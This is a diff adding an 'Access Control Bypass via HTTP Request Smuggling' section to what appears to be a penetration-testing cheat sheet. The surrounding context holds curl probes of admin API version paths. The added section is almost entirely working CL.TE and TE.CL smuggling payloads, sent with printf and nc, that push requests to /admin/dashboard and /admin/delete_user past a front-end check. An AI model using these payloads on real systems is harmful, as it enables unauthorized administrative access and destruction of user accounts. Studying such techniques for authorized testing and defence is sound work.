@@ -1038,3 +1038,20 @@ curl -s "http://target/api/v1/users/constructor" -H "Authorization: Bearer $TOKE
 curl -s "http://target/api/v99/admin/users" -H "Authorization: Bearer $TOKEN"
 curl -s "http://target/api/v0/admin/users" -H "Authorization: Bearer $TOKEN"
 ```
+
+---
+
+## 8. Access Control Bypass via HTTP Request Smuggling
+
+### CL.TE Smuggling for Access Control Bypass
+
+```bash
+# HTTP Request Smuggling to bypass front-end access control
+# Front-end (proxy) uses Content-Length, back-end uses Transfer-Encoding
+# This smuggles an admin request past the front-end ACL check
+
+printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/dashboard HTTP/1.1\r\nHost: target.com\r\nCookie: session=USER_TOKEN\r\nContent-Length: 0\r\n\r\n' | nc target.com 80
+
+# TE.CL variant smuggling for access control bypass
+printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin/delete_user?id=1 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=USER_TOKEN\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | nc target.com 80
+```
